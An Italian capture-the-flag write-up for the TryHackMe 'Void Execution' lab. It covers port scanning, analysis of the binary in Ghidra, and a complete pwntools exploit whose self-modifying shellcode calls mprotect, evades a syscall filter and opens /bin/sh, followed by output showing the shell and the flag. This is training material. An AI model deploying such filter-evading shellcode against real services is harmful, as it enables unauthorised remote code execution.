
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/hfb1voidexecution

Scopri come aggirare le restrizioni nello sviluppo di exploit Linux.

Aiutateci a trovare la vulnerabilità e a creare un exploit per il nuovo servizio Void.

```
sudo nmap -sC -sV -T4 -vv -p- 10.10.83.254
```

```
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6f:ea:54:1d:b0:cf:1e:94:72:b5:1d:3e:c0:0c:50:0f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMNxHj38d9B/RQj2lO11XU+/tVx0BSvatad7DijMKn+UsVTaMObakkJOIia07TCy06ndvq1/HC4f6ymlqlP0CNg=
|   256 dd:bf:6c:19:eb:08:31:b1:3e:07:93:57:88:5a:98:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXH/dnrOlJvk5f5/QlYF6tmgLjgx7zlrQZonGa8HsDa
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9008/tcp open  ogs-server? syn-ack ttl 62
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: 
|     Send to void execution: 
|     voided!
|   Kerberos, NotesRPC, ms-sql-s: 
|     Send to void execution: 
|     voided!
|     Forbidden!
|   NULL: 

```

su
http://10.10.83.254:9008/
abbiamo 
```
Send to void execution: 

voided!
```

```
nc 10.10.83.254 9008
```
```
└─# nc 10.10.83.254 9008

Send to void execution: 
hello

voided!

```

è un servizio che accetta comandi

ci dobbiamo scaricare il binario per capire come funziona

```
unzip voidexec.zip
```

```
checksec --file=voidexec
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# checksec --file=voidexec
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       FortifiableFILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   RW-RUNPATH   46 Symbols        No    0               2         voidexec

```

**NX** è abilitato non possiamo eseguire codice su memoria non scrivibile
**PIE** è abilitato gli indirizzi assoluti nel binario varieranno in fase di esecuzione

analizziamo il programma con **ghidra**

- selezioniamo la funzione main
```

undefined8 main(void)

{
  char cVar1;
  code *__s;
  
  setup();
  __s = (code *)mmap((void *)0xc0de0000,100,7,0x22,-1,0);
  memset(__s,0,100);
  puts("\nSend to void execution: ");
  read(0,__s,100);
  puts("\nvoided!\n");
  cVar1 = forbidden(__s);
  if (cVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  mprotect(__s,100,4);
  (*__s)();
  return 0;
}

```

```
cVar1 = forbidden(__s);  
if (cVar1 != '\0') {  
exit(1);  
}
```

Questo analizza l'input e restituisce true se contiene istruzioni non consentite

```
mprotect(__s, 100, 4);
```
questa rimuove i permessi di scrittura

a questo punto mi sono bloccato mi serviva creare un codice per sfruttare una vulnerabilità per eseguire codice arbitrario (in questo caso, aprire una shell) sulla macchina target. Utilizzando tecniche di exploit come la modifica dei permessi di memoria e l'esecuzione di syscall per ottenere il controllo del sistema.

ho trovato in rete questo codice già fatto, ma eseguirlo senza capire cosa faccia non ha senso!

```
nano exp.py
```
```
from pwn import *  
# Adjust target IP and port as needed  
target = remote("<TARGET_IP>", 9008)  
context.arch = 'amd64'  
# These offsets must be obtained from analyzing the local ELF binary  
main_offset = 0x12eb # Replace with actual main offset  
mprotect_offset = 0x1100 # Replace with actual mprotect PLT offset  
# Base address is 0xc0de0000, length 100 bytes  
shellcode = asm(f"""  
/* Compute mprotect address from r13 (holds main at runtime) */  
lea rbx, [r13 - {main_offset} + {mprotect_offset}]  
mov rdi, 0xc0de0000 /* address to change perms */  
mov rsi, 0x64 /* length */  
mov rdx, 0x7 /* PROT_READ | WRITE | EXEC */  
call rbx /* mprotect(addr, len, prot) */  
/* Setup execve("/bin/sh", NULL, NULL) */  
xor rsi, rsi  
xor rdx, rdx  
mov rax, 0x3b /* syscall: execve */  
mov rdi, 0x68732f6e69622f  
push rdi  
mov rdi, rsp  
/* Self-modifying syscall patch */  
inc byte ptr [rip + syscall]  
inc byte ptr [rip + syscall + 1]  
syscall:  
.byte 0x0e, 0x04 /* placeholder for syscall */  
""")  
print(f"[+] Sending {len(shellcode)} bytes of shellcode...")  
target.recvuntil(b"Send to void execution:")  
target.sendline(shellcode)  
target.interactive()
```
Il codice fornito è uno script Python che utilizza la libreria `pwntools` per sfruttare una vulnerabilità in un programma remoto. Ecco una spiegazione dettagliata di cosa fa il codice:

## Descrizione del Codice

### Connessione al Target

- **`target = remote("<TARGET_IP>", 9008)`**: Stabilisce una connessione a un server remoto all'indirizzo IP specificato e alla porta 9008.

### Impostazione dell'Architettura

- **`context.arch = 'amd64'`**: Imposta il contesto dell'architettura a `amd64`, il che significa che il codice assembler generato sarà per un sistema a 64 bit.

### Offset

- **`main_offset` e `mprotect_offset`**: Questi sono offset che devono essere ottenuti analizzando il binario ELF locale. Rappresentano la posizione della funzione `main` e la posizione della funzione `mprotect` nel PLT (Procedure Linkage Table).

### Shellcode

- **`shellcode = asm(f"""...""")`**: Qui viene generato il codice assembler (shellcode) che verrà inviato al target. Il shellcode esegue le seguenti operazioni:
    1. **Calcolo dell'indirizzo di `mprotect`**: Utilizza il registro `r13` (che si presume contenga l'indirizzo di `main` a runtime) per calcolare l'indirizzo della funzione `mprotect`.
    2. **Impostazione dei parametri per `mprotect`**:
        - `rdi` viene impostato all'indirizzo `0xc0de0000`, che è l'indirizzo di memoria per il quale si vogliono cambiare i permessi.
        - `rsi` è impostato a `0x64` (100 in decimale), che è la lunghezza della memoria da proteggere.
        - `rdx` è impostato a `0x7`, che rappresenta i permessi di lettura, scrittura ed esecuzione.
    3. **Chiamata a `mprotect`**: Viene chiamata la funzione `mprotect` per cambiare i permessi della memoria.
    4. **Preparazione per `execve`**: Configura i registri per eseguire `/bin/sh` utilizzando la syscall `execve`.
    5. **Patch auto-modificante**: Modifica il byte della syscall per eseguire il codice.

### Invio del Shellcode

- **`target.recvuntil(b"Send to void execution:")`**: Attende un messaggio specifico dal server prima di inviare il shellcode.
- **`target.sendline(shellcode)`**: Invia il shellcode al server.
- **`target.interactive()`**: Passa il controllo all'utente, permettendo di interagire con il processo remoto.

```
python3 exp.py
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# python3 exp.py
[+] Opening connection to 10.10.83.254 on port 9008: Done
[+] Sending 74 bytes of shellcode...
[*] Switching to interactive mode
 

voided!

$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
voidexec
$ cat flag.txt
THM{xxxxxxxxxxxxxx}
```

